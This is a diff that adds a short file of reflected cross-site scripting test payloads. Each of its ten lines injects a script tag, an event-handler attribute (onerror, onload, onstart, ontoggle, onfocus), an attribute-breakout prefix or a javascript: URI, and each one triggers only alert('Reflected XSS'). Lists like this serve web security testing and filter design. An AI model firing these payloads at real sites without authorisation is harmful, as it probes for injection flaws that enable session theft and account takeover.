@@ -1,0 +1,10 @@
+<script>alert('Reflected XSS')</script>
+<img src=x onerror=alert('Reflected XSS')>
+<svg/onload=alert('Reflected XSS')>
+"><script>alert('Reflected XSS')</script>
+<iframe src="javascript:alert('Reflected XSS');"></iframe>
+<form action="javascript:alert('Reflected XSS')" method="get"><input type="submit"></form>
+<isindex action="javascript:alert('Reflected XSS')">
+<marquee onstart="alert('Reflected XSS')">Reflected XSS</marquee>
+<details open ontoggle="alert('Reflected XSS')">Click here</details>
+<input type="text" value="Reflected XSS" onfocus="alert('Reflected XSS')" autofocus>
